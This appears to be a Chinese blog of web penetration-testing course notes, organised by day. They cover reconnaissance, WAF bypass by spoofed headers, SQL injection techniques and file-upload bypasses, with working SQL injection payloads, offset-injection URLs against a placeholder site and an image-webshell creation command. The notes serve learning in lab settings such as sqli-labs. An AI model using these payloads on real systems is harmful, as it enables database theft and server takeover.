<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"># CMS识别技术</span><br><span class="line"></span><br><span class="line"># 源码获取技术</span><br><span class="line"></span><br><span class="line"># 架构信息获取</span><br><span class="line"></span><br><span class="line"># 站点搭建分析</span><br><span class="line">目录型站点</span><br><span class="line">	- 同一网址下，不同路径是不同的站点搭建，即攻击其中一个成功，就可以对另一个站点造成影响</span><br><span class="line">端口型站点</span><br><span class="line">	- 不同端口下，不同的站点</span><br><span class="line">子域名站点</span><br><span class="line">类似域名站点</span><br><span class="line">旁注，C段站点</span><br><span class="line">	- 同服务器，不同站点</span><br><span class="line">搭建软件特征站点</span><br><span class="line"></span><br><span class="line"># WAF防护分析</span><br><span class="line">什么是WAF应用</span><br><span class="line">	- 应用级入侵防御系统</span><br><span class="line">	- 软件/硬件</span><br><span class="line">	- web应用防火墙</span><br><span class="line">如何快速识别WAF</span><br><span class="line">	- wafw00f</span><br><span class="line">识别WAF对于安全测试的意义 </span><br></pre></td></tr></table></figure>

<h2 id="第九天"><a href="#第九天" class="headerlink" title="第九天"></a>第九天</h2><p>信息收集-APP和其他信息</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 黑暗引擎</span><br><span class="line">shodan、zoomeye、fofa</span><br></pre></td></tr></table></figure>

<h2 id="第十天"><a href="#第十天" class="headerlink" title="第十天"></a>第十天</h2><p>资产监控扩展</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># Github监控</span><br><span class="line">便于手机整理最新的exp或poc</span><br><span class="line">便于发现相关测试目标的资产</span><br><span class="line"></span><br><span class="line"># 各种</span><br></pre></td></tr></table></figure>

<ul>
<li>爬取信息的工具<ul>
<li>黑暗引擎</li>
<li>全自动域名收集枚举优秀脚本</li>
<li>SRC目标中的信息收集全覆盖</li>
<li>利用其他三方接口获取更多信息</li>
</ul>
</li>
</ul>
<h2 id="第十一天"><a href="#第十一天" class="headerlink" title="第十一天"></a>第十一天</h2><p>WEB漏洞</p>
<p><img src="/2021/10/01/xiaodi1/image-20210906091716474.png" alt="image-20210906091716474"></p>
<ul>
<li>漏洞危害</li>
<li>漏洞等级</li>
<li>漏洞重点</li>
<li>漏洞形式</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># sql注入</span><br><span class="line"># 目录遍历</span><br><span class="line"># 文件读取</span><br><span class="line"># 文件上传</span><br></pre></td></tr></table></figure>

<h2 id="第十二天"><a href="#第十二天" class="headerlink" title="第十二天"></a>第十二天</h2><p>sql注入——严重安全漏洞</p>
<p>回显注入                                                                    access</p>
<p><img src="/2021/10/01/xiaodi1/image-20210906151400324.png" alt="image-20210906151400324"> </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"># sql注入的安全危害</span><br><span class="line">操作数据库</span><br><span class="line">后门写入</span><br><span class="line"># sql注入产生原理</span><br><span class="line">可控变量，带入数据块是查询，变量未存在过滤或过滤不严谨</span><br><span class="line"></span><br><span class="line">sql注入，通过将参数传递到服务器实现查询。</span><br><span class="line"></span><br><span class="line">实验案例</span><br><span class="line">sqllib less2：联合查询</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="/2021/10/01/xiaodi1/image-20210906152218077.png" alt="image-20210906152218077"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"># 判断注入</span><br><span class="line">and 1=1 </span><br><span class="line">猜测列名数量（字段数） order by x 正常与错误的临界点</span><br><span class="line"></span><br><span class="line"># 信息收集</span><br><span class="line">数据库版本：version()</span><br><span class="line">数据库名字：database（）</span><br><span class="line">数据库用户：user（）</span><br><span class="line">操作系统：@@version_compile_os</span><br><span class="line"></span><br><span class="line">必备知识点</span><br><span class="line">在mysql 5.0以上版本中，mysql存在一个自带数据库名为information_schema，他是一个存储所有数据库名、表名、列名的数据库，也相当于可以通过查询它获得相应数据库下的表名和列名。</span><br><span class="line">数据库中.代表下一级，user.xiaodi 代表user下的xiaodi</span><br><span class="line">information_schema.tables			表</span><br><span class="line">information_schema.columes			列</span><br><span class="line"></span><br><span class="line">sql语句group_concat()将查询到的数据连接起来</span><br></pre></td></tr></table></figure>

<h2 id="第十三天"><a href="#第十三天" class="headerlink" title="第十三天"></a>第十三天</h2><p><img src="/2021/10/01/xiaodi1/image-20210907131059658.png" alt="image-20210907131059658"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">MYSQL注入</span><br><span class="line"></span><br><span class="line"># 高权限注入</span><br><span class="line"></span><br><span class="line"># 文件读写操作</span><br><span class="line">load_file()				读取函数</span><br><span class="line">into outfile 或into dumpfile			导出函数</span><br><span class="line"></span><br><span class="line"># 路径获取常见方法</span><br><span class="line">报错显示、遗留文件、漏洞报错、平台配置文件、爆破、等</span><br><span class="line"></span><br><span class="line"># 常见读取文件列表</span><br><span class="line"></span><br><span class="line"># 常见写入文件问题：魔术引号开关</span><br><span class="line">存在魔术引号：编码、宽字节绕过</span><br><span class="line"></span><br><span class="line"># 低版本注入配合读取或暴力</span><br><span class="line">字典或读取</span><br></pre></td></tr></table></figure>

<h2 id="第十四天"><a href="#第十四天" class="headerlink" title="第十四天"></a>第十四天</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">SQL中的干扰语句：&#x27;,&quot;,%,(,),&#125;</span><br><span class="line"></span><br><span class="line"># 简要明确参数类型</span><br><span class="line">数字，字符，搜索，Json等</span><br><span class="line"></span><br><span class="line"># 简要明确请求方法</span><br><span class="line">GET，POST，cookie，request，HTTP</span><br><span class="line"></span><br><span class="line"># 注释方法 --+、#</span><br><span class="line">--+ 是url编码后的-- (空格)</span><br><span class="line">url编码将空格转化为+</span><br><span class="line"></span><br><span class="line"># sqllibs-less11：</span><br><span class="line">POST注入</span><br><span class="line">不能用--+，要用#，应为POST内容没有经过url编码</span><br><span class="line"></span><br><span class="line"># sqllibs-less20</span><br><span class="line">限制POST注入长度</span><br><span class="line">cookie注入可以绕过POST</span><br><span class="line"></span><br><span class="line"># sqllibs-less18</span><br><span class="line">JSON格式</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="第十五天"><a href="#第十五天" class="headerlink" title="第十五天"></a>第十五天</h2><p>oracle，MongoDB注入</p>
<p><img src="/2021/10/01/xiaodi1/image-20210911094537072-16313247437281.png" alt="image-20210911094537072"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"># JSON注入</span><br><span class="line"></span><br><span class="line">数字类型不需要闭合</span><br><span class="line">自负类型需要闭合 </span><br><span class="line"></span><br><span class="line"># 简要学习各种注入工具的使用指南</span><br><span class="line"></span><br><span class="line">数据库架构组成，数据库高权限操作</span><br><span class="line"></span><br><span class="line"># 注入工具</span><br><span class="line"></span><br><span class="line">sqlmap、nosqlattack、pangolin</span><br><span class="line"></span><br><span class="line"># 网站注入点用户权限由连接数据库的用户决定，</span><br><span class="line"></span><br><span class="line">写在网站服务器sql的配置文件中</span><br></pre></td></tr></table></figure>



<h2 id="第十六天"><a href="#第十六天" class="headerlink" title="第十六天"></a>第十六天</h2><p>查询方式及报错盲注</p>
<p>当进行sql注入时，是很多注入会出现无回显的情况，其中不回显的原因可能是sql语句查询方式的问题导致，这个时候我们需要用到相关的报错或盲注进行后续操作。同时作为手工注入时，提前了解或预知其他sql语句大概写法也能更好地选择对应的注入语句。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"># 补充：Access暴力猜想不出问题</span><br><span class="line">Access偏移注入：解决列名获取不到情况</span><br><span class="line">查看登录框原代码的表单或观察URL特征等也可以针对表或列获取不到情况</span><br><span class="line"></span><br><span class="line">偏移语句</span><br><span class="line">1.猜字段数</span><br><span class="line"></span><br><span class="line">http://www.xxx.com/show.asp?id=123 order by 20 页面返回正确</span><br><span class="line">http://www.xxx.com/show.asp?id=123 order by 21 页面返回错误</span><br><span class="line"></span><br><span class="line">2.猜表名：</span><br><span class="line"></span><br><span class="line">http://www.xxx.com/show.asp?id=123 union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20 from admin</span><br><span class="line">返回正确，说明存在admin表，但是紧接着，爆出的数字地方，放入常用的字段始终报错，并不能猜出正确的字段，进而：</span><br><span class="line"></span><br><span class="line">3.猜表下的字段数：</span><br><span class="line"></span><br><span class="line">为了让语句正确，用*来加长字段数：</span><br><span class="line"></span><br><span class="line">http://www.xxx.com/show.asp?id=123 union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19，* from admin（页面报错）</span><br><span class="line">… …</span><br><span class="line">http://www.xxx.com/show.asp?id=123 union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,* from admin（页面正确）</span><br><span class="line"></span><br><span class="line">此时就发现了admin表下有四个字段（20-16=4）。</span><br><span class="line"></span><br><span class="line">4.inner join 连接查询：</span><br><span class="line"></span><br><span class="line">inner join查询是将一张表虚拟成多张相同的表来进行查询（我自己是这么理解的。）</span><br><span class="line">首先用两张表来进行查询，应该减去重复的部分也就是这四个字段，不能让这四个字段算两次，这样的话20-4-4=12，语句中只需要罗列出12个数字。</span><br><span class="line"></span><br><span class="line">http://www.xxx.com/show.asp?id=123 union select 1,2,3,4,5,6,7,8,9,10,11,12,* from (admin as a inner join admin as b on?a.id = b.id)</span><br><span class="line">http://www.xxx.com/show.asp?id=123 union select 1,2,3,4,5,6,7,8,9,10,11,12,a.id,b.id,* from (admin as a inner join?admin as b on a.id = b.id)</span><br><span class="line"></span><br><span class="line">上面的这两种情况还是报错，那么我们继续再来添加一张表，再减去重复的四个字段，20-4-4-4=8，语句中只需要罗列出8个数字,再次使用inner join查询：</span><br><span class="line">http://www.xxx.com/show.asp?id=123 union select 1,2,3,4,5,6,7,8,a.id,b.id,c.id,* from ((admin as a inner join admin as?b on a.id=b.id) inner join admin as c on a.id=c.id)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">select</span><br><span class="line">insert</span><br><span class="line">delete</span><br><span class="line">update</span><br><span class="line">order by</span><br><span class="line"></span><br><span class="line"># 重点理解</span><br><span class="line">我们可以通过查询方式与网站应用的关系</span><br><span class="line">注入点产生地方或应用猜测到对方的SQL查询方式</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">SQL注入报错盲注</span><br><span class="line">盲注就是在注入过程中，获取的数据不能回显到前端页面。此时，我们需要利用一些当打进行判断或者尝试，这个过程称之为盲注。我们可以知道盲注分为以下三类：</span><br><span class="line">基于布尔的sql盲注-逻辑判断（第二优先）</span><br><span class="line">regexp、like、ascii、left、ord、mid</span><br><span class="line"></span><br><span class="line">基于时间的sql盲注-延时判断（第三优先，效率最慢）</span><br><span class="line">if、sleep</span><br><span class="line">不推荐，受网络和服务器响应的影响</span><br><span class="line"></span><br><span class="line">基于报错的sql盲注-报错回显（最优先，效率最快）</span><br><span class="line">floor、updatexml、extractvalue</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">mysql报错注入payload</span><br><span class="line"></span><br><span class="line">1.floor()</span><br><span class="line"></span><br><span class="line">select * from test where id=1 and (select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)a);</span><br><span class="line"></span><br><span class="line">2.extractvalue()</span><br><span class="line"></span><br><span class="line">select * from test where id=1 and (extractvalue(1,concat(0x7e,(select user()),0x7e)));</span><br><span class="line"></span><br><span class="line">3.updatexml()</span><br><span class="line"></span><br><span class="line">select * from test where id=1 and (updatexml(1,concat(0x7e,(select user()),0x7e),1));</span><br><span class="line"></span><br><span class="line">4.geometrycollection()</span><br><span class="line"></span><br><span class="line">select * from test where id=1 and geometrycollection((select * from(select * from(select user())a)b));</span><br><span class="line"></span><br><span class="line">5.multipoint()</span><br><span class="line"></span><br><span class="line">select * from test where id=1 and multipoint((select * from(select * from(select user())a)b));</span><br><span class="line"></span><br><span class="line">6.polygon()</span><br><span class="line"></span><br><span class="line">select * from test where id=1 and polygon((select * from(select * from(select user())a)b));</span><br><span class="line"></span><br><span class="line">7.multipolygon()</span><br><span class="line"></span><br><span class="line">select * from test where id=1 and multipolygon((select * from(select * from(select user())a)b));</span><br><span class="line"></span><br><span class="line">8.linestring()</span><br><span class="line"></span><br><span class="line">select * from test where id=1 and linestring((select * from(select * from(select user())a)b));</span><br><span class="line"></span><br><span class="line">9.multilinestring()</span><br><span class="line"></span><br><span class="line">select * from test where id=1 and multilinestring((select * from(select * from(select user())a)b));</span><br><span class="line"></span><br><span class="line">10.exp()</span><br><span class="line"></span><br><span class="line">select * from test where id=1 and exp(~(select * from(select user())a));</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">判断database：首先判断长度</span><br><span class="line"></span><br><span class="line">参考</span><br><span class="line">like</span><br><span class="line">regexp</span><br><span class="line">if</span><br><span class="line">sleep</span><br><span class="line">mid</span><br><span class="line">substr</span><br><span class="line">left</span><br><span class="line">length</span><br><span class="line">ord</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># MySQL注入天书</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="第十七天"><a href="#第十七天" class="headerlink" title="第十七天"></a>第十七天</h2><p>二次，加解密，dns等注入</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"># 加解密</span><br><span class="line">sqllabs-less21</span><br><span class="line">当发送的注入点数据是加密的时候，需要先解密将明文连接payload再加密</span><br><span class="line"></span><br><span class="line"># 二次</span><br><span class="line">前端和黑盒看不到，只有从源代码看到</span><br><span class="line">sqlilabs-less24</span><br><span class="line">类似定时炸弹，将payload合法提交写入数据库，等待再次使用来触发</span><br><span class="line">长度限制，分为前端和后端</span><br><span class="line">前端可以绕过，修改前端代码</span><br><span class="line">后端无法绕过</span><br></pre></td></tr></table></figure>

<p><img src="/2021/10/01/xiaodi1/image-20210914150820973.png" alt="image-20210914150820973"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># DNSlog注入</span><br><span class="line">需要高权限</span><br><span class="line">文件读取操作</span><br><span class="line">工具dnslogSql</span><br><span class="line">注入sql，让数据库访问dns</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="第十八天"><a href="#第十八天" class="headerlink" title="第十八天"></a>第十八天</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># 堆叠注入</span><br><span class="line">select * from database1;select * from database2;</span><br><span class="line">只在部分数据库起作用</span><br><span class="line">例如：注入需要管理员账号密码，密码加密，无法解密。</span><br><span class="line">堆叠注入进行插入数据，用户密码自定义的，可以正常解密登录。</span><br></pre></td></tr></table></figure>

<p><img src="/2021/10/01/xiaodi1/image-20210915091354495.png" alt="image-20210915091354495"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">反序列化有情况要求</span><br><span class="line">不同数据库特殊符号和注释符号不同</span><br><span class="line"></span><br><span class="line">mysql在数据中插入/**/不影响命令运行</span><br><span class="line">%0A是十六进制的换行</span><br><span class="line">%23    #</span><br><span class="line"></span><br><span class="line"># 参数污染</span><br><span class="line">传递两个相同参数</span><br><span class="line">根据服务器配置的中间件，读取第一个参数或最后一个参数</span><br><span class="line">y=1&amp;y=2</span><br><span class="line">/** payload #*/属于mysql注释符</span><br><span class="line">/*! payload */;内联注释</span><br><span class="line">可正常运行</span><br><span class="line"></span><br><span class="line">FUZZ-暴力测试</span><br></pre></td></tr></table></figure>

<h2 id="第十九天"><a href="#第十九天" class="headerlink" title="第十九天"></a>第十九天</h2><p>WAF绕过</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">其他绕过方法</span><br><span class="line"># 白名单</span><br><span class="line">伪造白名单方法</span><br><span class="line"></span><br><span class="line">方法一：IP白名单</span><br><span class="line">x-forwarded-for</span><br><span class="line">x-remote-IP</span><br><span class="line">x-originating-IP</span><br><span class="line">x-remote-addr</span><br><span class="line">x-Real-ip</span><br><span class="line"></span><br><span class="line">方法二：静态资源</span><br><span class="line">在网址末尾加上x.txt等静态文件，静态文件不会接收参数，参数还是传递给脚本文件执行</span><br><span class="line"></span><br><span class="line">方法三：url白名单</span><br><span class="line">为防止误拦，部分waf内置默认的白名单列表，只要url中存在白名单的字符串，就作为白名单不进行检测。</span><br><span class="line"></span><br><span class="line">方法四：爬虫白名单</span><br><span class="line">部分waf有提供爬虫白名单的功能，识别爬虫的技术一般有两种：</span><br><span class="line">1.根据userAgent</span><br><span class="line">2.通过行为判断</span><br><span class="line"></span><br><span class="line">WAF流量防御</span><br><span class="line">爬虫白名单</span><br><span class="line">代理池</span><br></pre></td></tr></table></figure>

<h2 id="第二十天"><a href="#第二十天" class="headerlink" title="第二十天"></a>第二十天</h2><p><img src="/2021/10/01/xiaodi1/image-20210916085637100.png" alt="image-20210916085637100"></p>
<p><img src="/2021/10/01/xiaodi1/image-20210916090202933.png" alt="image-20210916090202933"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">文件上传漏洞是高危漏洞，可以直接上传后门软件获取权限</span><br><span class="line"></span><br><span class="line">文件上传漏洞如何查找及判断</span><br><span class="line">黑盒查找</span><br><span class="line">后台拿 webshell</span><br><span class="line">文件后台、会员中心、文件扫描</span><br><span class="line">白盒查找</span><br><span class="line"></span><br><span class="line">文件上传漏洞注意</span><br><span class="line">编辑器、第三方、会员后台</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># 解析漏洞</span><br><span class="line">photo.png/1.php</span><br><span class="line">将png格式图片解析成php，成功执行php代码</span><br><span class="line"></span><br><span class="line">靶场：uploadlabs</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="第二十一天"><a href="#第二十一天" class="headerlink" title="第二十一天"></a>第二十一天</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">文件上传常见验证：</span><br><span class="line">后缀名、类型、文件头</span><br><span class="line"></span><br><span class="line"># 后缀名</span><br><span class="line">黑名单</span><br><span class="line">asp php jsp aspx cgi war</span><br><span class="line">白名单</span><br><span class="line">jpg png zip rar gif</span><br><span class="line"></span><br><span class="line"># 类型</span><br><span class="line">在数据包中有一项为数据类型：</span><br><span class="line">Content-Type: image/gif</span><br><span class="line"></span><br><span class="line"># 文件头</span><br><span class="line">检测文件内容</span><br><span class="line">伪装文件头为合法文件</span><br><span class="line"></span><br><span class="line"># htaccess解析</span><br><span class="line">htaccess：</span><br><span class="line">&lt;FilesMatch &quot;conf&quot;&gt; </span><br><span class="line">SetHandler application/x-httpd-php </span><br><span class="line">&lt;/FilesMatch&gt;</span><br><span class="line">这样config.txt这个文件就会解析为php</span><br><span class="line"></span><br><span class="line"># 缺少收尾去空</span><br><span class="line">可在数据包中的filename在末尾添加空格（ ）实现绕过</span><br><span class="line">服务器保存时会强制删去空格还原为php</span><br><span class="line"></span><br><span class="line"># 缺少删除文件最后的.</span><br><span class="line">可在数据包中的filename在末尾添加.实现绕过</span><br><span class="line">服务器保存时会强制删去空格还原为php</span><br><span class="line"></span><br><span class="line"># ::$$DATA绕过( windows系统)</span><br><span class="line">windows系统中::$$DATA之后的数据将被当作文件流处理，文件会保存::$$DATA之前的文件名</span><br><span class="line"></span><br><span class="line"># 一次过滤和循环过滤</span><br><span class="line">一次过滤可以添加添加多个.或空格实现绕过</span><br><span class="line"></span><br><span class="line"># %00截断</span><br><span class="line">文件保存地址将%00之后的文件路径截断</span><br><span class="line">1.php%00photh.jpg保存为1.php</span><br><span class="line">get自动解码</span><br><span class="line">post不解码</span><br><span class="line"></span><br><span class="line"># 0x00截断</span><br><span class="line">文件</span><br></pre></td></tr></table></figure>

<h2 id="第二十二天"><a href="#第二十二天" class="headerlink" title="第二十二天"></a>第二十二天</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">图片一句话制作方法：</span><br><span class="line">copy 1.png /b + shell.php /a webshell.jpg</span><br><span class="line"></span><br><span class="line">文件头检测</span><br><span class="line">图像文件信息判断</span><br><span class="line">逻辑安全-二次渲染</span><br><span class="line">逻辑安全-条件竞争</span><br><span class="line">目录命名-x.php/.</span><br><span 